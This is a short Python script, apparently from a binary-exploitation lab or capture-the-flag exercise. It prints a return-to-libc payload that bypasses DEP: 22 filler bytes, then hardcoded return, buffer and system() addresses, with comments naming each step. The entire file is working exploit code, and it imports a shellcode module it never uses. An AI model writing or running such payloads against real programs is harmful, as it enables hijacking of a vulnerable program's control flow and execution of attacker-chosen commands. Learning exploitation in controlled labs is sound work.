import sys
from struct import pack
from shellcode import shellcode

#Return-to-libc attack to bypass DEP
#Overflow buffer with A's
#Pass return, buffer, and system call address
sys.stdout.buffer.write(b"A"*22 + b"\x30\x25\x05\x08" + b"\xc0\x0d\x05\x08" + b"\xed\xe1\x0b\x08")

